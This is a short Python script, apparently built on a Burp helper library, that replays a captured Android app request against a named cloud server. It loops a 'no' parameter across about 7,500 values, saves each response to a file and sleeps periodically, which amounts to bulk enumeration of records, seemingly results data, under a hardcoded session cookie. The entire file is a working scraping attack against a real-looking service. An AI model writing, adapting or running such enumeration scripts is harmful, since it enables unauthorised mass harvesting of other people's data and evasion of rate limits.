from burp import *
import time

c = """
POST /SundownSrv/1xcessResult HTTP/1.1
Cookie: JSESSIONID=63FD1BCDB0DB6184606A7B63FE98C5F5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; MI NOTE LTE MIUI/6.4.14)
Host: ec2-52-34-46-127.us-west-2.compute.amazonaws.com
Connection: close
Accept-Encoding: gzip
Content-Length: 9

no=%s&
"""

for i in range(40001, 47468):
	r = code('http', c % (i))
	with open('records/%d.txt' % (i), 'w') as f:
		f.write(r.text.encode('ascii', 'ignore').decode('ascii'))

	if i % 10 == 0:
		print 'Sleeping'
		time.sleep(3)
